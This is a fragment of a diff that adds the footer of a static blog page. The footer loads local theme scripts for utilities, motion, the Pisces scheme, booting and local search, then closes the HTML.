+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
